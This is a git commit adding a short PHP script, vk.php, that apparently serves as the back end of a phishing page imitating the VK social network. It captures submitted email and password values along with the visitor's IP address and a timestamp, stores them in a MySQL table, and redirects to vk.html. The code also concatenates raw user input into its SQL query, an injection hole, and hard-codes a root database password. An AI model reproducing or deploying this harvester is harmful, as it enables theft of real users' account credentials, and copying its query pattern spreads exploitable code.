048b656d8b26022fc40eb27075af92f38fa804b3
Saif <saif.mowefak@gmail.com>
2014-12-25 16:09:06 +0200

    v

---
+++ vk.php
@@ -0,0 +1,21 @@
+<?php
+	date_default_timezone_set('Europe/Kiev'); 
+	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+	    $ip = $_SERVER['HTTP_CLIENT_IP'];
+	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	} else {
+	    $ip = $_SERVER['REMOTE_ADDR'];
+	}
+	
+    $date = date('Y-m-d H:i:s');
+	$email = mb_strtolower($_POST['email']);
+	$pass = mb_strtolower($_POST['pass']);
+
+	$conn = mysqli_connect('localhost', 'root', '0000', 'vk') or die(mysqli_error($conn));
+	mysqli_set_charset($conn, "utf-8");
+
+	mysqli_query($conn, "INSERT INTO vk values(NULL, '$email', '$pass', '$ip', '$date')") or die(mysqli_error($conn));
+
+	header('location: vk.html');
+?>
